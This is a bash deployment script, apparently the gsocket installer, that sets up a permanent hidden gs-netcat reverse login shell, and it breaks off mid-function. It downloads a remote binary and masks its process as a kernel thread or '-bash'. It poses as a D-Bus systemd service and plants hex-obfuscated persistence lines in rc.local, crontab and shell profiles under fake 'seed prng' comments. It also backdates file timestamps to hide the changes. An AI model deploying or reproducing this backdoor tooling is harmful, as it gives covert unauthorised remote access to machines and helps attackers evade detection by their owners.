#! /usr/bin/env bash

# Install and start a permanent gs-netcat reverse login shell
#
# See https://www.gsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL gsocket.io/x)"
#
# Connect
#   $ S=MySecret bash -c "$(curl -fsSL goscket.io/x)""
# Pre-set a secret:
#   $ X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 bash -c" $(curl -fsSL gsocket.io/x)"
#
# Steps taken:
# 1. Download pre-compiled binary
# 2. Create a new secret (random)
# 3. Start gs-netcat as a interactive reverse login shell and hidden process
# 4. Install gs-netcat and automatically start after reboot
#
# Other variables:
# GS_DEBUG=1
#		- Verbose output
#		- Shorter timeout to restart crontab etc
#       - Often used like this:
#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
# GS_USELOCAL=1
#       - Use local binaries (do not download)
# GS_USELOCAL_GSNC=<path to gs-netcat binary>
#       - Use local gs-netcat from source tree
# GS_NOSTART=1
#       - Do not start gs-netcat (for testing purpose only)
# GS_NOINST=1
#		- Do not install backdoor
# GS_OSARCH=x86_64-alpine
#       - Force architecutre to a specific package (for testing purpose only)
# GS_PREFIX=path
#		- Use 'path' instead of '/' (needed for packaging/testing)
# GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
#		- Specify URL of static binaries
# GS_DSTDIR="/tmp/foobar/blah"
#		- Specify custom installation directory
# GS_HIDDEN_NAME="-bash"
#       - Specify custom hidden name for process
# TMPDIR=
#       - Guess what...

# Global Defines
URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
[[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
URL_DEPLOY="gsocket.io/x"
# GS_VERSION=1.4.34
DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
# DL_CMD="$DL_CRL"
BIN_HIDDEN_NAME_DEFAULT=gs-dbus
PROC_HIDDEN_NAME_DEFAULT="[kcached/0]"
CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none

if [[ -z "$GS_DEBUG" ]]; then
	DEBUGF(){ :;}
else
	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
fi

exit_clean()
{
	[[ "${#TMPDIR}" -gt 5 ]] && { rm -rf "${TMPDIR:?}/"*; rmdir "${TMPDIR}"; } &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-old" &>/dev/null
	rm -rf "${GS_PREFIX}/etc/rc.local-new" &>/dev/null
}

exit_code()
{
	exit_clean

	exit "$1"
}

errexit()
{
	[[ -z "$1" ]] || echo -e 1>&2 "${CR}$*${CN}"

	exit_code 255
}

# When all was successfull
exit_alldone()
{
	echo 1>&1 "$*"
	exit_code 0
}

fs_make_old()
{
	[[ -f /etc/ld.so.conf ]] || return
	touch -r /etc/ld.so.conf "$1"
}

# Test if directory can be used to store executeable
# try_dstdir "/tmp/.gs-foobar"
# Return 0 on success.
try_dstdir()
{
	local dstdir
	local trybin
	dstdir="${1}"

	# Create directory if it does not exists.
	[[ ! -d "${dstdir}" ]] && { mkdir -p "${dstdir}" &>/dev/null || return 101; }

	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
	# Return if not writeable
	touch "$DSTBIN" &>/dev/null || { return 102; }

	# Test if directory is mounted with noexec flag and return success
	# if binary can be executed from this directory.
	ebin="/bin/true"
	if [[ ! -e "$ebin" ]]; then
		ebin=$(command -v id 2>/dev/null)
		[[ -z "$ebin" ]] && return 0 # Try our best
	fi

	# Must use same name on busybox-systems
	trybin="${dstdir}/$(basename "$ebin")"

	# /bin/true might be a symlink to /usr/bin/true
	if [[ -f "${trybin}" ]]; then
		# Between 28th of April and end of May we accidentially
		# overwrote /bin/true with gs-dbus binary. Thus we use -g
		# which is a valid argument for gs-dbus, true and id
		# and returns 0 (true)
		"${trybin}" -g &>/dev/null || { return 103; } # FAILURE
	else 
		cp "$ebin" "$trybin" &>/dev/null || return 0
		"${trybin}" &>/dev/null || { rm -f "${trybin}"; return 103; } # FAILURE
		rm -f "${trybin}"
	fi

	return 0
}

# Called _after_ init_vars() at the end of init_setup.
init_dstbin()
{
	if [[ -n "$GS_DSTDIR" ]]; then
		try_dstdir "${GS_DSTDIR}" && return

		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable."
	fi

	# Try systemwide installation first
	try_dstdir "${GS_PREFIX}/usr/bin" && return

	# Try user installation
	try_dstdir "${GS_PREFIX}${HOME}/.config/dbus" && return

	# Try /tmp/.gsusr-*
	try_dstdir "/tmp/.gsusr-${UID}" && return

	# Try /dev/shm as last resort
	try_dstdir "/dev/shm" && return

	echo -e 1>&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}"
	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
	errexit
}

try_tmpdir()
{
	[[ -n $TMPDIR ]] && return # already set

	[[ ! -d "$1" ]] && mkdir -p "$1" 2>/dev/null

	[[ -d "$1" ]] && mkdir -p "${1}/${2}" 2>/dev/null && TMPDIR="${1}/${2}"
}

init_vars()
{
	# Select binary
	local arch
	arch=$(uname -m)

	if [[ -z "$HOME" ]]; then
		HOME="$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6)"
		[[ ! -d "$HOME" ]] && errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"
		WARN "HOME not set. Using '$HOME'"
	fi

	# User supplied OSARCH
	[[ -n "$GS_OSARCH" ]] && OSARCH="$GS_OSARCH"

	if [[ -z "$OSARCH" ]]; then
		if [[ $OSTYPE == *linux* ]]; then 
			if [[ "$arch" == "i686" ]] || [[ "$arch" == "i386" ]]; then
				OSARCH="i386-alpine"
			elif [[ "$arch" == *"armv"* ]]; then
				OSARCH="armv6l-linux" # RPI-Zero / RPI 4b+
			elif [[ "$arch" == "aarch64" ]]; then
				OSARCH="aarch64-linux"
			elif [[ "$arch" == "mips64" ]]; then
				OSARCH="mips64-alpine"
			elif [[ "$arch" == *mips* ]]; then
				OSARCH="mips32-alpine"
			fi
		elif [[ $OSTYPE == *darwin* ]]; then
			if [[ "$arch" == "arm64" ]]; then
				OSARCH="x86_64-osx" # M1
				# OSARCH="arm64-osx" # M1
			else
				OSARCH="x86_64-osx"
			fi
		elif [[ $OSTYPE == *FreeBSD* ]]; then
				OSARCH="x86_64-freebsd"
		elif [[ $OSTYPE == *cygwin* ]]; then
				OSARCH="x86_64-cygwin"
		# elif [[ $OSTYPE == *gnu* ]] && [[ "$(uname -v)" == *Hurd* ]]; then
				# OSARCH="i386-hurd" # debian-hurd
		fi

		[[ -z "$OSARCH" ]] && OSARCH="x86_64-alpine" # Default: Try Alpine(muscl libc) 64bit
	fi

	# Docker does not set USER
	[[ -z "$USER" ]] && USER=$(id -un)
	[[ -z "$UID" ]] && UID=$(id -u)

	try_tmpdir "/dev/shm" ".gs-${UID}"
	try_tmpdir "/tmp" ".gs-${UID}"
	try_tmpdir "${HOME}/.tmp" ".gs-${UID}"

	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"

	# OSX's pkill matches the hidden name and not the original binary name.
	# Because we hide as '-bash' we can not use pkill all -bash.
	# 'killall' however matches gs-dbus and on OSX we thus force killall
	if [[ $OSTYPE == *darwin* ]]; then
		KL_CMD="killall"
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	elif command -v pkill >/dev/null; then
		KL_CMD="pkill"
		KL_CMD_RUNCHK_UARG=("-0" "-U${UID}")
	elif command -v killall >/dev/null; then
		KL_CMD="killall"
		# cygwin's killall needs the name (not the uid)
		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
	fi

	# $PATH might be set differently in crontab/.profile. Use
	# absolute path to binary instead:
	KL_CMD_BIN="$(command -v "$KL_CMD")"
	[[ -z $KL_CMD_BIN ]] && {
		# set to something that returns 'false' so that we dont
		# have to check for empty string in crontab/.profile
		KL_CMD_BIN="$(command -v false)"
		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
		WARN "No pkill or killall found."
	}

	# Defaults
	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
	
	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"

	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"

	# Create a list of potential rc-files.
	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
	# - .bash_login is ignored if .bash_profile exists
	# - $SHELL might not be set (if /bin/sh was gained by RCE)
	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
	if [[ -f ~/.bashrc ]]; then
		RC_FN_LIST+=(".bashrc")
		# Assume .bashrc is loaded by .bash_profile and .profile
	else
		# HERE: not bash or .bashrc does not exist
		if [[ -f ~/.bash_profile ]]; then
			RC_FN_LIST+=(".bash_profile")
		elif [[ -f ~/.bash_login ]]; then
			RC_FN_LIST+=(".bash_login")
		fi
	fi
	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")

	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"

	DEBUGF "SRC_PKG=$SRC_PKG"
}

init_setup()
{
	if [[ -n "$GS_PREFIX" ]]; then
		# Debuggin and testing into separate directory
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
			touch -r "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
		fi
		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
	fi

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
	mkdir "$TMPDIR" &>/dev/null

	touch "${TMPDIR}/.gs-${UID}.lock" || errexit "FAILED. No temporary directory found for downloading package."
	rm -f "${TMPDIR}/.gs-${UID}.lock" 2>/dev/null

	# Find out which directory is writeable
	init_dstbin

	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"

	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"

	# Do not add TERM= or SHELL= here because we do not like that to show in gs-dbus.service
	[[ -n $GS_HOST ]] && ENV_LINE+=("GS_HOST='${GS_HOST}'")
	[[ -n $GS_PORT ]] && ENV_LINE+=("GS_PORT='${GS_PORT}'")
	# Add an empty item so that ${ENV_LINE[*]}GS_ARGS= adds an extra space between
	[[ ${#ENV_LINE[@]} -ne 0 ]] && ENV_LINE+=("")

	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"

	# There is no reliable way to check if a process is running:
	# - Process might be running under different name. Especially OSX checks for the orginal name
	#   but not the hidden name.
	# - pkill or killall may have moved.
	# The best we can do:
	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (${ENV_LINE[*]}TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}' 2>/dev/null)"
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"

	# check that xxd is working as expected (alpine linux does not have -r option)
	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
		local p
		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"

		p="$(echo "$PROFILE_LINE" | xxd -ps -c1024)"
		PROFILE_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"

		p="$(echo "$CRONTAB_LINE" | xxd -ps -c1024)"
		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
	fi
	DEBUGF "TMPDIR=${TMPDIR}"
	DEBUGF "DSTBIN=${DSTBIN}"
}

uninstall_rm()
{
	[[ -z "$1" ]] && return
	[[ ! -f "$1" ]] && return # return if file does not exist

	echo 1>&2 "Removing $1..."
	rm -rf "$1"
}

uninstall_rmdir()
{
	[[ -z "$1" ]] && return
	[[ ! -d "$1" ]] && return # return if file does not exist

	rmdir "$1" 2>/dev/null || return
	echo 1>&2 "Removing $1..."
}

uninstall_rc()
{
	local hname
	local fn
	hname="$2"
	fn="$1"

	[[ ! -f "$fn" ]] && return # File does not exist

	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed

	echo 1>&2 "Removing ${fn}..."
	touch -r "${fn}" "${fn}-ts"
	[[ ! -f "${fn}-ts" ]] && return # permission denied
	D="$(grep -v -F -- "${hname}" "$fn")"
	echo "$D" >"${fn}"
	touch -r "${fn}-ts" "${fn}"
	rm -f "${fn}-ts"

	[[ ! -s "${fn}" ]] && rm -f "${fn}" 2>/dev/null # delete zero size file
}

uninstall_service()
{
	local sn
	local sf
	sn="$1"
	sf="/etc/systemd/system/${sn}.service"

	[[ ! -f "${sf}" ]] && return

	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && {
		# STOPPING would kill the current login shell. Do not stop it.
		# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
		systemctl disable "${sn}" 2>/dev/null
	}

	uninstall_rm "${sf}"
} 

# Rather important function especially when testing and developing this...
uninstall()
{
	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${BIN_HIDDEN_NAME}"
	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd"
	uninstall_rm "${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd"
	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
	uninstall_rm "/tmp/.gsusr-${UID}/${BIN_HIDDEN_NAME}"

	uninstall_rm "${RCLOCAL_DIR}/${SEC_NAME}"
	uninstall_rm "${RCLOCAL_DIR}/gs-bd.dat"
	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}${HOME}/.config/dbus/gs-bd.dat"
	uninstall_rm "${GS_PREFIX}/usr/bin/${SEC_NAME}"
	uninstall_rm "${GS_PREFIX}/usr/bin/gs-bd.dat"
	uninstall_rm "/dev/shm/${SEC_NAME}"

	uninstall_rmdir "${GS_PREFIX}${HOME}/.config/dbus"
	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
	uninstall_rmdir "/tmp/.gsusr-${UID}"

	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
	uninstall_rm "${TMPDIR}/${SRC_PKG}"
	uninstall_rm "${TMPDIR}/._gs-netcat" # from docker???
	uninstall_rmdir "${TMPDIR}"

	# Remove from login script
	for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${BIN_HIDDEN_NAME}"
		uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "gs-bd"
	done 
	uninstall_rc "${GS_PREFIX}/etc/rc.local" "${BIN_HIDDEN_NAME}" 
	uninstall_rc "${GS_PREFIX}/etc/rc.local" "gs-bd" 

	# Remove crontab
	if [[ ! $OSTYPE == *darwin* ]]; then
		command -v crontab >/dev/null && crontab -l 2>/dev/null | grep -v -F -- "${BIN_HIDDEN_NAME}" | grep -v -F -- "gs-bd" | crontab - 2>/dev/null 
	fi

	# Remove systemd service
	uninstall_service "${SERVICE_HIDDEN_NAME}"
	uninstall_service "gs-bd"
	systemctl daemon-reload 2>/dev/null

	## Systemd's gs-dbus.dat
	uninstall_rm "${SYSTEMD_SEC_FILE}"
	uninstall_rm "/etc/system/system/gs-bd.dat"

	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
	exit 0
}

SKIP_OUT()
{
	echo -e 1>&2 "[${CY}SKIPPING${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

OK_OUT()
{
	echo -e 1>&2 "......[${CG}OK${CN}]"
	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
}

FAIL_OUT()
{
	echo -e 1>&2 "..[${CR}FAILED${CN}]"
	for str in "$@"; do
		echo -e 1>&2 "--> $str"
	done
}

WARN()
{
	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
}

WARN_EXECFAIL_SET()
{
	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
}

WARN_EXECFAIL()
{
	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
}

HOWTO_CONNECT_OUT()
{
	# After all install attempts output help how to uninstall
	echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
	echo -e 1>&2 "--> To connect use one of the following:
--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
}

# Try to load a GS_SECRET
gs_secret_reload()
{
	DEBUGF "secret_load(${1})"
	[[ -n $GS_SECRET_FROM_FILE ]] && return
	[[ ! -f "$1" ]] && return

	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
	local sec
	sec=$(<"$1")
	[[ ${#sec} -lt 4 ]] && return
	WARN "Using existing secret from '${1}'"
	if [[ ${#sec} -lt 10 ]]; then
		WARN "SECRET in '${1}' is very short! (${#sec})"
	fi
	GS_SECRET_FROM_FILE=$sec
}

gs_secret_write()
{
	echo "$GS_SECRET" >"$1"
	chmod 600 "$1"
	fs_make_old "$1"
}

install_system_systemd()
{
	[[ ! -d "${GS_PREFIX}/etc/systemd/system" ]] && return
	command -v systemctl >/dev/null || return
	[[ "$(systemctl is-system-running 2>/dev/null)" = *"offline"* ]] &>/dev/null && return
	if [[ -f "${SERVICE_FILE}" ]]; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
		SKIP_OUT "${SERVICE_FILE} already exists."
		return
	fi

	# Create the service file
	echo "[Unit]
Description=D-Bus System Connection Bus
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"

[Install]
WantedBy=multi-user.target" >"${SERVICE_FILE}"

	chmod 600 "${SERVICE_FILE}"
	fs_make_old "${SERVICE_FILE}"
	gs_secret_write "$SYSTEMD_SEC_FILE"

	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}" "${SYSTEMD_SEC_FILE}"; return; } # did not work... 

	IS_SYSTEMD=1
	((IS_INSTALLED+=1))
}

# inject a string ($2-) into the 2nd line of a file and retain the
# PERM/TIMESTAMP of the target file ($1)
install_to_file()
{
	local fname="$1"

	shift 1

	touch -r "${fname}" "${fname}-ts" || return

	D="$(IFS=$'\n'; head -n1 "${fname}" && \
		echo "${*}" && \
		tail -n +2 "${fname}")"
	echo "$D" >"${fname}"

	touch -r "${fname}-ts" "${fname}"
	rm -f "${fname}-ts"
}

install_system_rclocal()
{
	[[ ! -f "${RCLOCAL_FILE}" ]] && return
	# Some systems have /etc/rc.local but it's not executeable...
	[[ ! -x "${RCLOCAL_FILE}" ]] && return
	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
		return	
	fi

	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.

	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"

	gs_secret_write "$RCLOCAL_SEC_FILE"

	((IS_INSTALLED+=1))
}

install_system()
{
	echo -en 2>&1 "Installing systemwide remote access permanentally....................."

	# Try systemd first
	install_system_systemd

	# Try good old /etc/rc.local
	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal

	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }

	[[ -n $IS_SKIPPED ]] && return
	
	OK_OUT
}

install_user_crontab()
{
	command -v crontab >/dev/null || return # no crontab
	echo -en 2>&1 "Installing access via crontab........................................."
	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in crontab."
		return
	fi

	local cr_time
	cr_time="59 * * * *"
	# [[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
	(crontab -l 2>/dev/null && \
	echo "$NOTE_DONOTREMOVE" && \
	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }

	((IS_INSTALLED+=1))
	OK_OUT
}

install_user_profile()
{
	local rc_filename_status
	local rc_file
	local rc_filename

	rc_filename="$1"
	rc_filename_status="${rc_filename}................................"
	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"

	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
	[[ -f "${rc_file}" ]] || { touch "${rc_file}"; chmod 600 "${rc_file}"; }
	if grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${rc_file}"
		return
	fi

	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"

	((IS_INSTALLED+=1))
	OK_OUT
}

install_user()
{
	# Use crontab if it's not in systemd (but might be in rc.local).
	if [[ ! $OSTYPE == *darwin* ]]; then
		install_user_crontab
	fi

	[[ $IS_INSTALLED -ge 2 ]] && return
	# install_user_profile
	for x in "${RC_FN_LIST[@]}"; do
		install_user_profile "$x"
	done

	gs_secret_write "$USER_SEC_FILE" # Create new secret file
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	echo "--> Attempting without certificate verification."
	echo "--> Press any key to continue or CTRL-C to abort..."
	echo -en 1>&2 -en "--> Continuing in "
	local n

	n=10
	while :; do
		echo -en 1>&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -r -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo 1>&2 "0"

	GS_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
dl_ssl()
{
	if [[ -z $GS_NOCERTCHECK ]]; then
		DL_LOG=$("$3" "$4" "$5" "$6" "$7" 2>&1)
		[[ "${DL_LOG}" != *"$2"* ]] && return
	fi

	if [[ -z $GS_NOCERTCHECK ]]; then
		SKIP_OUT
		ask_nocertcheck
	fi
	[[ -z $GS_NOCERTCHECK ]] && return

	echo -en 2>&1 "Downloading binaries without certificate verification................."
	DL_LOG=$("$3" "$1" "$4" "$5" "$6" "$7" 2>&1)
}

# Download $1 and save it to $2
dl()
{
	[[ -s "$2" ]] && return

	# Need to set DL_CMD before GS_DEBUG check for proper error output
	# DL_CMD is used for help output of how to uninstall
	if [[ -n "$GS_USELOCAL" ]]; then
		DL_CMD="./deploy-all.sh"
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
		errexit
	fi

	# Debugging / testing. Use local package if available
	if [[ -n "$GS_USELOCAL" ]]; then
		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
		[[ -f "${1}" ]] && cp "${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi
	[[ -n "$GS_USELOCAL" ]] && return # NOT REACHED

	# HERE: It's either wget or curl (but not GS_USELOCAL)
	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
		dl_ssl "-k" "certificate problem" "curl" "-fL" "${URL_BASE}/${1}" "--output" "${2}"
	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "wget" "" "${URL_BASE}/${1}" "-O" "${2}"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi

	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
}

# S= was set. Do not install but execute in place.
gs_access()
{
	echo -e 2>&1 "Connecting..."
	local ret
	GS_SECRET="${S}"

	"${DSTBIN}" -s "${GS_SECRET}" -i
	ret=$?
	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
	[[ $ret -eq 61 ]] && {
		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
	}

	exit_code "$ret"
}

# gs_update()
# {
# 	echo -en 2>&1 "Checking existing binaries............................................"

# 	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
# 	OK_OUT

# 	local gsnc_bin
# 	gsnc_bin="$(command -v gs-netcat)"

# 	echo -en 2>&1 "Backup old binaries..................................................."
# 	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
# 	OK_OUT

# 	echo -en 2>&1 "Updating binaries....................................................."

# 	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
# 	OK_OUT

# 	echo -en 2>&1 "Testing updated binaries.............................................."
# 	ver_new="$(gs-netcat -h 2>&1 | grep ^Version | sed -E 's/Version (.*),.*/\1/g')"
# 	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }

# 	OK_OUT "Updated to $ver_new"
# 	exit 0
# }

# Binary is in an executeable directory (no noexec-flag)
# set IS_TESTBIN_OK if binary worked.
# test_bin <binary>
test_bin()
{
	local bin
	local err_log
	unset IS_TESTBIN_OK

	bin="$1"

	# Try to execute the binary
	GS_OUT=$("$bin" -g 2>/dev/null)
	ret=$?
	# 126 - Exec format error
